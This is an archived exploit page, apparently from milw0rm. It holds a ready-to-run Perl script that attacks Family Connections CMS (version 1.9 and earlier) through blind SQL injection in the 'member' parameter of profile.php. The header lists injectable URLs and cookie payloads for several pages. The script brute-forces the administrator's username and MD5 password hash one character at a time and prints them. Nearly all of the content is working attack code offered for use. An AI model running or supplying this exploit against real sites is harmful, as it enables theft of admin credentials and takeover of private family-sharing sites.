<html><head><title>Family Connections CMS <= 1.9 (member) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
#** [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
#**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
#**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    **
#**							                                      **
#**    											      **
#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
#**					¡PROUD TO BE SPANISH!				      **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#----------------------------------------------------------------------------------------------
#|       	   	   (GET var 'member') BLIND SQL INJECTION EXPLOIT  		      |
#|--------------------------------------------------------------------------------------------|
#|                           |      FAMILY CONNECTIONS &lt;= v1.9     |		              |
#|  CMS INFORMATION:	      -------------------------------------	                      |
#|										              |
#|--&gt;WEB: http://www.familycms.com/index.php		         	                      |
#|--&gt;DOWNLOAD: http://www.familycms.com/download.php	          	                      |
#|--&gt;DEMO: http://www.familycms.com/demo/index.php   	   				      |
#|--&gt;CATEGORY: CMS/PORTAL								      |
#|--&gt;DESCRIPTION: A private, easy-to-use website where you can connect  	 	      |
#|		with your friends and family. Share photos, messages, documents and more.     |
#|--&gt;RELEASED: 2009-05-11								      |
#|											      |
#|  CMS VULNERABILITY:									      |
#|											      |
#|--&gt;TESTED ON: firefox 3								      |
#|--&gt;DORK: &quot;2006-2009 Ryan Haudenschilt&quot;				                      |
#|--&gt;CATEGORY: BLIND SQL INJECTION EXPLOIT			                              |
#|--&gt;AFFECT VERSION: &lt;= 1.9				 			              |
#|--&gt;Discovered Bug date: 2009-05-11							      |
#|--&gt;Reported Bug date: 2009-05-11							      |
#|--&gt;Fixed bug date: N/A								      |
#|--&gt;Info patch (????): N/A					  			      |
#|--&gt;Author: YEnH4ckEr									      |
#|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							      |
#|--&gt;WEB/BLOG: N/A									      |
#|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
#|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		      |
#----------------------------------------------------------------------------------------------
#
#############
#-----------
#HISTORY:
#-----------
#############
#
#
#2008-06-14 --&gt; http://www.milw0rm.com/exploits/5811 --&gt; v1.4 --&gt; Fixed
#
#2009-03-30 --&gt; http://www.milw0rm.com/exploits/8319 --&gt; v1.8.1 --&gt; Not Fixed! (**)
#
#2009-04-03 --&gt; http://www.milw0rm.com/exploits/8349 --&gt; &lt;=v1.8.2 --&gt; Fixed
#
#2009-04-07 --&gt; http://www.milw0rm.com/exploits/8361 --&gt; &lt;=v1.8.2 --&gt; Not Fixed! (**)
#
#
#################################
#-------------------------------
#CURRENTLY:BLIND SQL INJECTION
#-------------------------------
#################################
#
#
#&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: magic quotes=OFF/ON +++++++++++++++++---------&gt;&gt;&gt;&gt;
#
#&lt;&lt;&lt;&lt;-----------++++++++++++ Condition: Be register user  +++++++++++++-----------&gt;&gt;&gt;&gt;
#
#
#=========
#---------
#COOKIES:
#---------
#=========
#
#
#fcms_login_uname=your_real_name
#
#fcms_login_pw=your_real_pass
#
#fcms_login_id=your_real_id+and+1=1
#
#
#(Delete PHPSESSID) Result: True --&gt; Show page
#
#
#fcms_login_user=your_real_name
#
#fcms_login_pass=your_real_pass
#
#fcms_login_id=your_real_id+and+1=0
#
#
#(Delete PHPSESSID) Result: False --&gt; Don't Show page
#
#
#Exploits --&gt; (**)
#
#
#=====================================
#-------------------------------------
#(messageboard.php) GET var 'thread':
#-------------------------------------
#=====================================
#
#
#http://[HOST]/[PATH]/messageboard.php?thread=1+AND+1=1 --&gt; TRUE
#
#http://[HOST]/[PATH]/messageboard.php?thread=1+AND+1=0 --&gt; FALSE
#	
#
#================================
#--------------------------------
#(profile.php) GET var 'member':
#--------------------------------
#================================
#
#
#http://[HOST]/[PATH]/profile.php?member=2+AND+1=1 --&gt; TRUE
#
#http://[HOST]/[PATH]/profile.php?member=2+AND+1=0 --&gt; FALSE
#	
#
#===================================
#-----------------------------------
#(gallery/index.php) GET var 'pid':
#-----------------------------------
#===================================
#
#
#http://[HOST]/[PATH]/gallery/index.php?uid=2&amp;cid=2&amp;pid=1+and+1=1 --&gt; TRUE
#
#http://[HOST]/[PATH]/gallery/index.php?uid=2&amp;cid=2&amp;pid=1+and+1=0 --&gt; FALSE
#	
#
###########################
#--------------------------
#CONDITIONS TO EXPLOITING:
#--------------------------
###########################
#
#
#Valid username and password and id (Id is shown in cookies with autologin).
#
#
#######################################################################
#######################################################################
##*******************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
##     GREETZ TO: JosS, Ulises2k and all spanish Hack3Rs community!  ##
##*******************************************************************##
#######################################################################
#######################################################################
#
#
#-------------------EOF--INFO-------------------------------&gt;&gt;&gt;ENJOY IT!
#
#
use LWP::UserAgent;
use HTTP::Request;
use Digest::MD5 qw(md5_hex);
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = &quot;&quot;;
	if (index(lc($SO),&quot;win&quot;)!=-1){
		$linux=&quot;0&quot;;
	}else{
		$linux=&quot;1&quot;;
	}		
	if($linux){
		system(&quot;clear&quot;);
	}
	else{
		system(&quot;cls&quot;);
		system (&quot;title Family Connections &lt;= v1.9 (GET var 'member') BLIND SQL Injection Exploit&quot;);
		system (&quot;color 02&quot;);
	}
}
sub request {
	my $userag = LWP::UserAgent-&gt;new;
	$userag -&gt; agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	my $request = HTTP::Request -&gt; new(GET =&gt; $_[0]);
	my $cookieid=&quot;fcms_login_id=&quot;.$_[1];
	my $cookieuname=&quot;fcms_login_uname=&quot;.$_[2];
	my $cookiepw=&quot;fcms_login_pw=&quot;.$_[3];
	my $cookie=$cookieid.&quot;;&quot;.$cookieuname.&quot;;&quot;.$cookiepw;
	$request-&gt;header(cookie =&gt; $cookie);
	my $outcode= $userag-&gt;request($request)-&gt;as_string;
	return $outcode;
	
}
sub helper {
	print &quot;\n\t[!-!] Family Connections &lt;= v1.9 (GET var 'member') BLIND SQLi Exploit\n&quot;;
	print &quot;\t[!-!] USAGE MODE: [!-!]\n&quot;;
	print &quot;\t[!-!] perl $0 [HOST] [PATH] [your-user] [your-pass] [your-id]\n&quot;;
	print &quot;\t[!-!] [HOST]: Web.\n&quot;;
	print &quot;\t[!-!] [PATH]: Home Path. Not use path= no-path\n&quot;;
	print &quot;\t[!-!] [your-user]: Your username.\n&quot;;
	print &quot;\t[!-!] [your-pass]: Your password.\n&quot;;
	print &quot;\t[!-!] [your-id]: Id in cookies --&gt; Name=fcms_login_id.\n&quot;;
	print &quot;\t[!-!] Example: perl $0 'www.example.es' 'dogarchive' 'y3nh4ck3r' 'y3nh4ck3r' '123'\n&quot;; 
}
sub error {
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tWEB IS NOT VULNERABLE!\n\n&quot;;
	print &quot;\tMaybe --&gt; \n\n&quot;;
	print &quot;\t1.-Patched\n&quot;;
	print &quot;\t2.-You aren't registered. Invalid username, password or id.\n\n&quot;;
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t-----------------------------------------------------------------\n&quot;;
}
sub testedblindsql {
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tWEB MAYBE BE VULNERABLE!\n\n&quot;;
	print &quot;\tTested Blind SQL Injection.\n&quot;;		
	print &quot;\tStarting exploit...\n&quot;; 
	print &quot;\t-----------------------------------------------------------------\n\n&quot;;
}
sub brute_length{
#User length
$exit=0;
$i=0;
while($exit==0){
	my $blindsql=$_[0].&quot;+AND+(SELECT+length(username)+FROM+fcms_users+WHERE+id=1)=&quot;.$i++; #injected code
	$output=&amp;request($blindsql,$_[1],$_[2],$_[3]);
	if($output =~ (/\&lt;h3\&gt;$_[2], $_[2]\&lt;\/h3&gt;/)){
		$exit=1;
	}else{
		$exit=0;
	}
	#Maybe patched. This is the max length of username
	if($i&gt;25){
	&amp;error;
	exit(1);
	}
}
#Save column length
$length=$i-1;
print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
print &quot;\tLength User catched!\n&quot;;
print &quot;\tLength User: &quot;.$length.&quot;\n&quot;;
print &quot;\tBruteforcing User and Password values.\n&quot;;
print &quot;\tWait several minutes (15 o 20 minutes)...\n&quot;;
print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n\n&quot;;
return $length;
}
sub exploiting {
#Bruteforcing
$values=&quot;&quot;;
$k=1;
	$z=48;
	while(($k&lt;=$_[1]) &amp;&amp; ($z&lt;=126)){
		my $blindsql=$_[0].'+AND+ascii(substring((SELECT+'.$_[2].'+FROM+fcms_users+WHERE+id=1),'.$k.',1))='.$z;
		$output=&amp;request($blindsql,$_[3],$_[4],$_[5]);
		if ($output =~ (/\&lt;h3\&gt;$_[4], $_[4]\&lt;\/h3&gt;/))
		{
			$values=$values.chr($z);
			$k++;
			$z=47;
		}
#new char
	$z++; 
	}
return $values;
}
#Main
&amp;lw;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t##   Family Connections &lt;= v1.9 - BLIND SQLi Exploit   ##\n\n&quot;;
	print &quot;\t\t##                  Author: Y3nh4ck3r                  ##\n\n&quot;;
	print &quot;\t\t##         Contact:y3nh4ck3r[at]gmail[dot]com          ##\n\n&quot;;
	print &quot;\t\t##                  Proud to be Spanish!               ##\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
#Init variables
	my $host=$ARGV[0];
	my $path=$ARGV[1];
	my $myuser=$ARGV[2];
	my $mypass=md5_hex($ARGV[3]);
	my $myid=$ARGV[4];
#Build the uri
#Build the uri
	if($path eq &quot;no-path&quot;){
		$finalhost=&quot;http://&quot;.$host.&quot;/profile.php?member=&quot;.$myid;
	}else{
		$finalhost=&quot;http://&quot;.$host.&quot;/&quot;.$path.&quot;/profile.php?member=&quot;.$myid;
	}
#Check all variables needed
$numArgs = $#ARGV + 1;
	if($numArgs&lt;=4) 
	{
		&amp;helper;
		exit(1);	
	}
$finalrequest = $finalhost;	
#Testing blind sql injection
$blindsql=$finalrequest.&quot;+AND+1=1&quot;;
$output=&amp;request($blindsql,$myid,$myuser,$mypass);
if ($output =~ (/\&lt;h3\&gt;($myuser, $myuser)\&lt;\/h3&gt;/))
{    
	#blind sql injection is available
	&amp;testedblindsql;
}else{ 
	#Not injectable
	&amp;error;
	exit(1); 
}
#Bruteforcing length
$length_user=&amp;brute_length($finalrequest,$myid,$myuser,$mypass);	
#Bruteforcing username...
$username=&amp;exploiting($finalrequest,$length_user,'username',$myid,$myuser,$mypass);
#Bruteforcing password...
$passhash=&amp;exploiting($finalrequest,32,'password',$myid,$myuser,$mypass);
#final checking (perhaps admin id is not 2252)
if((!$username) || (!$passhash)){
	&amp;error;
	exit(1);
}
print &quot;\n\t\t*************************************************\n&quot;;
print &quot;\t\t*********  EXPLOIT EXECUTED WITH SUCCESS ********\n&quot;;
print &quot;\t\t*************************************************\n\n&quot;;
print &quot;\t\tAdmin-username: &quot;.$username.&quot;\n&quot;;
print &quot;\t\tAdmin-password(md5 hash): &quot;.$passhash.&quot;\n\n&quot;;
print &quot;\n\t\t&lt;&lt;----------------------FINISH!--------------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;---------------Thanks to: y3hn4ck3r--------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;------------------------EOF----------------------&gt;&gt;\n\n&quot;;
exit(1);
#Ok...all job done

# milw0rm.com [2009-05-13]</pre></html>